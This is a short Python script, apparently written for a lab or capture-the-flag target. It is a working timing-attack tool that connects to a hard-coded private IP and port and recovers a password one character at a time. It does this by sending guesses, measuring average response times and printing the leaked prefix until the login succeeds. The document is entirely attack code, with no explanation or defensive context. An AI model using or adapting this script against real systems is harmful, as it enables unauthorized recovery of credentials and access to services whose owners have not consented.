import socket
import string
import sys
from time import *

IP="192.168.1.104"
PORT=54311

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

data = s.recv(512)
data = s.recv(512)

print("[*] Connected and start a timing attack")

sampleCount = 5
charSet = string.ascii_letters + string.digits
pwd=""

while True:
	lowestTime = (999.0, '')
	for char in charSet:
		quess = pwd + char

		totalTime = 0.0
		for i in range(0, sampleCount):
			s.send(quess+"\n")

			start = time()
			res = s.recv(1024)
			deltaTime = time() - start

			totalTime += deltaTime

		avgTime = totalTime/sampleCount
		#print("%s: %f" % (char, avgTime))

		if avgTime < lowestTime[0]:
			lowestTime = (avgTime, char)

		if not ("Invalid password!" in res or "Password" in res):

			print("Password founded: %s" % quess)
			sys.exit()

	pwd += lowestTime[1]
	print("Leaked: %s" % pwd)
	